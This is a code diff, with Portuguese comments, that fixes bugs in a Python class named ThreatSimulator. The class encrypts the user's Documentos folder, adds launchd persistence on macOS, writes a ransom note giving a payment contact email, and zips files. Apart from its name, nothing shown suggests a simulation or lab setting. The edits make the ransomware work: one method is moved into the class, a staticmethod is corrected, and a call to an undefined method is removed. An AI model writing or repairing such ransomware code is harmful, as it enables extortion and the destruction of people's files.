@@ -16,7 +16,7 @@ class ThreatSimulator:
         self.home_directory = os.path.expanduser("~")
         self.documentos_folder = os.path.join(self.home_directory, 'Documentos')
         self.directories_to_encrypt = [self.documentos_folder]
-        self.extension = ".m3n_r4ns0n"
+        self.extension = ".bsp"
 
     def generate_key(self, password: bytes) -> bytes:
         from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -80,7 +80,7 @@ class ThreatSimulator:
             f.write("For assistance or to initiate payment, contact us at:\n")
             f.write("Email: binaryninja@protonmail.com\n")
 
-    def add_launchd_persistence():
+    def add_launchd_persistence(self):  # Corrigido: movido para dentro da classe
         try:
             plist_dir = os.path.join(os.path.expanduser("~/Library/LaunchAgents"))
             if not os.path.exists(plist_dir):
@@ -115,7 +115,7 @@ class ThreatSimulator:
         except Exception as e:
             print(f"Erro ao adicionar persistência: {e}")
 
-
+    @staticmethod
     def check_and_install_requests():
         try:
             importlib.import_module('requests')
@@ -125,7 +125,6 @@ class ThreatSimulator:
                 import requests
             except Exception:
                 pass
-    check_and_install_requests = staticmethod(check_and_install_requests)
 
     def zip_files(self, documentos_folder):
         from datetime import datetime
@@ -170,7 +169,7 @@ class ThreatSimulator:
         self.encrypt_directory(self.documentos_folder, self.extension)
         self.add_launchd_persistence()
         self.create_threat_note()
-        self.set_wallpaper_from_url("https://academy.avast.com/hs-fs/hubfs/New_Avast_Academy/the_essential_guide_to_ransomware_academy_refresh_2/img-01.png?width=788&height=409&name=img-01.png")
+        # Removido: self.set_wallpaper_from_url("...") pois o método não está definido
 
 def main():
     threat_simulator = ThreatSimulator()
